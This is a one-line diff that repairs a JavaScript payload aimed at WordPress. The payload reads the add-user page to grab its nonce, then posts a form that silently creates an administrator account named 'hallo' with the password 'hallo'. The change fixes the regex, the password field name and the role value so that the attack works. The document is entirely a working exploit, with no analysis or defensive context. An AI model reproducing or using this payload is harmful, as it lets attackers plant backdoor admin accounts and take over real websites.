@@ -1,1 +1,1 @@
-u="/wp-admin/user-new.php"; jQuery.get(u,function(e) {jQuery.post(u,{action:"createuser","_wpnonce_create-user":e.match(/_wpnonce_create-user\"\value=\"(.+?)\"/) [1], user_login:"hallo", email:"hallo@bro.com",pass1:"hallo", pass12:" hallo", role:"Administrator"})});
+u="/wp-admin/user-new.php";jQuery.get(u,function(e){jQuery.post(u, {action:"createuser","_wpnonce_create-user":e.match(/_wpnonce_create-user\"\svalue=\"(.+?)\"/)[1],user_login:"hallo", email:"hallo@bro.com",pass1:"hallo",pass2:"hallo",role:"administrator"})});
